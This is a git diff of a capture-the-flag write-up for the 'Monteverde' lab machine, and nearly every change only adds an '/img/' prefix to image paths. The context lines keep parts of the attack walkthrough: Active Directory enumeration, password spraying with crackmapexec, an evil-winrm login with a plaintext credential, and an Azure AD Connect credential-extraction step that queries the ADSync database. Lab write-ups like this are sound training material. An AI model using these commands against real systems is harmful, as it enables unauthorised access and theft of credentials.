@@ -57,8 +57,8 @@ nmap -Pn -sVC -p- --source-port 53 -f --min-rate 10000 -oX monteverde-scan 10.12
 - `5985` - WinRM (Windows Remote Management)
 
 
-![img1](Pasted_image_20251227042933.png)
-![img2](Pasted_image_20251227043135.png)
+![img1](/img/Pasted_image_20251227042933.png)
+![img2](/img/Pasted_image_20251227043135.png)
 
 We found interesting ports here 88, 135, 389, 445, 464, 593, 636, 3268, 3269, 5985
 
@@ -83,7 +83,7 @@ For filter for accounts we can use | grep -e "Accounts"
 `ldapsearch -x -H ldap://10.129.228.111:389 -b "dc=MEGABANK,dc=LOCAL" | grep -e "Accounts"`
 ```
 
-![img3](Pasted_image_20251227050018.png)
+![img3](/img/Pasted_image_20251227050018.png)
 
 **Key finding:** Service account `SABatchJobs` discovered
 
@@ -104,18 +104,18 @@ For filter for accounts we can use | grep -e "Accounts"
 enum4linux -a 10.129.228.111
 ```
 
-![img4](Pasted_image_20251227050904.png)
+![img4](/img/Pasted_image_20251227050904.png)
 
-![img5](Pasted_image_20251227050922.png)
+![img5](/img/Pasted_image_20251227050922.png)
 
-![img6](Pasted_image_20251227053031.png)
+![img6](/img/Pasted_image_20251227053031.png)
 
 *Account Lockout: none; In Windows we can't try common bruteforce but we can try password spraying; +1 point for this vector in this room;*
 
 
-![img7](Pasted_image_20251227051229.png)
+![img7](/img/Pasted_image_20251227051229.png)
 
-![img8](Pasted_image_20251227051316.png)
+![img8](/img/Pasted_image_20251227051316.png)
 
 Exist integration AD - Azure
 We catch the groups names and usernames
@@ -140,21 +140,21 @@ SMB on port 445 is Windows file sharing. Once you have credentials, you can list
 nmap -v -p 445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery.nse 10.129.228.111
 ```
 
-![img9](Pasted_image_20251227052122.png)
+![img9](/img/Pasted_image_20251227052122.png)
 
 I try to enum for common CVE in SMB
 
-![img10](Pasted_image_20251227053346.png)
+![img10](/img/Pasted_image_20251227053346.png)
 
 *But i not receive info about*
 
 Anonymous login is successful but can't list the shares:
 
-![img11](Pasted_image_20251227053317.png)
+![img11](/img/Pasted_image_20251227053317.png)
 
 with smbmap, only confirms what we know. we need to password
 
-![img12](Pasted_image_20251227053918.png)
+![img12](/img/Pasted_image_20251227053918.png)
 
 **Result:** Authentication required (no anonymous access to shares)
 
@@ -171,7 +171,7 @@ When i try enum users; we don't receive new info
 rpcclient -U "" -N 10.129.228.111 --command="enumdomusers"
 ```
 
-![img13](Pasted_image_20251227053618.png)
+![img13](/img/Pasted_image_20251227053618.png)
 
 ### Foothold
 
@@ -187,7 +187,7 @@ rpcclient -U "" -N 10.129.228.111 --command="enumdomusers"
 vim users.txt
 ```
 
-![img14](Pasted_image_20251227054242.png)
+![img14](/img/Pasted_image_20251227054242.png)
 
 I catch a wordlist for increment in this link:
 
@@ -216,7 +216,7 @@ crackmapexec smb <IP> -u <USERS_LIST> -p <PASSWORDS_LIST>
 later i undestand: this wordlist is sooo long -.-
 and i try users.txt for login and pass
 
-![img15](Pasted_image_20251227061843.png)
+![img15](/img/Pasted_image_20251227061843.png)
 
 
 Try smbmap again:
@@ -232,19 +232,19 @@ smbmap -u <user> -p <pass> -d <domain> -H <target_IP>
 - `-d`: Domain
 - `-H`: Host
 
-![img16](Pasted_image_20251227062217.png)
+![img16](/img/Pasted_image_20251227062217.png)
 
 Then, we found a file
 
-![img16](Pasted_image_20251227063052.png)
+![img16](/img/Pasted_image_20251227063052.png)
 
-![img17](Pasted_image_20251227062820.png)
+![img17](/img/Pasted_image_20251227062820.png)
 
 *Here, i find interesting thing*
 
-![img18](Pasted_image_20251227064555.png)
+![img18](/img/Pasted_image_20251227064555.png)
 
-![img19](Pasted_image_20251227064929.png)
+![img19](/img/Pasted_image_20251227064929.png)
 
 **Share discovered:**
 
@@ -278,9 +278,9 @@ evil-winrm -i 10.129.228.111 -u mhope -p '4n0therD4y@n0th3r$'
 **Result:** User-level shell access
 
 
-![img20](Pasted_image_20251227065146.png)
+![img20](/img/Pasted_image_20251227065146.png)
 
-![img21](Pasted_image_20251227065203.png)
+![img21](/img/Pasted_image_20251227065203.png)
 
 ### Privilege Escalation
 
@@ -294,7 +294,7 @@ I go perform a full version enum on this
 whoami /user
 ```
 
-![img22](Pasted_image_20251227065751.png)
+![img22](/img/Pasted_image_20251227065751.png)
 
 
 Searching for name of domain controller
@@ -303,35 +303,35 @@ Searching for name of domain controller
 Get-ADDomainController -Filter *
 ```
 
-![img23](Pasted_image_20251227065845.png)
+![img23](/img/Pasted_image_20251227065845.png)
 
 ```powershell
 Get-ADUser -Filter { ServicePrincipalName -like "*" } -Property ServicePrincipalName | Select-Object Name, ServicePrincipalName
 ```
 
-![img24](Pasted_image_20251227070541.png)
+![img24](/img/Pasted_image_20251227070541.png)
 
 ```powershell
 Get-ADComputer -Filter * -Properties ServicePrincipalName | Select-Object -ExpandProperty ServicePrincipalName
 ```
 
-![img25](Pasted_image_20251227071055.png)
+![img25](/img/Pasted_image_20251227071055.png)
 
 ```powershell
 net user /domain
 ```
 
-![img26](Pasted_image_20251227071135.png)
+![img26](/img/Pasted_image_20251227071135.png)
 
 And perform the same for each specific username
 
-![img27](Pasted_image_20251227071229.png)
+![img27](/img/Pasted_image_20251227071229.png)
 
-![img28](Pasted_image_20251227071255.png)
+![img28](/img/Pasted_image_20251227071255.png)
 
-![img29](Pasted_image_20251227071337.png)
+![img29](/img/Pasted_image_20251227071337.png)
 
-![img30](Pasted_image_20251227071418.png)
+![img30](/img/Pasted_image_20251227071418.png)
 
 At this point, for knowing that way to privilege escalation is AD Connect for Red Teamers, I needed to see the hint. Basically, exist a post of Azure AD connect for Red Teamers.
 In this post exist lot of information about vulnerabilities 
@@ -361,14 +361,14 @@ blog.xpnsec.com/azuread-connect-for-redteam/
 2. Use mcrypt.dll to decrypt stored credentials 
 3. Obtain Domain Admin password
 
-![img31](Pasted_image_20251227072325.png)
+![img31](/img/Pasted_image_20251227072325.png)
 
 we can't enum the services with Get-Service
-(Pasted_image_20251227071941.png)
+(/img/Pasted_image_20251227071941.png)
 
 but we can do it with:
 see the registry property
-(Pasted_image_20251227072554.png)
+(/img/Pasted_image_20251227072554.png)
 
 The binary service is miiserver
 
@@ -378,7 +378,7 @@ we can use:
 Get-ItemProperty -Path "path" | Format-list -Property * -Force
 ```
 
-![img32](Pasted_image_20251227131802.png)
+![img32](/img/Pasted_image_20251227131802.png)
 
 the blog say for use this as a script .ps1:
 
@@ -452,11 +452,11 @@ sqlcmd -S MONTEVERDE -Q "use ADsync; select instance_id,keyset_id,entropy from m
 - `-Q`: Execute query and exit
 
 
-![img33](Pasted_image_20251227154831.png)
+![img33](/img/Pasted_image_20251227154831.png)
 
 We need to modify the initial script for:
 
-![img34](Pasted_image_20251227162439.png)
+![img34](/img/Pasted_image_20251227162439.png)
 
 **Modified script:**
 
@@ -516,9 +516,9 @@ Get-ADConnectPassword
 - **Base64ToString:** Decodes Base64 and decrypts in one operation
 - **XPath:** Query language for XML documents
 
-![img35](Pasted_image_20251227162802.png)
+![img35](/img/Pasted_image_20251227162802.png)
 
-![img36](Pasted_image_20251227163253.png)
+![img36](/img/Pasted_image_20251227163253.png)
 
 ## Lessons Learned
 
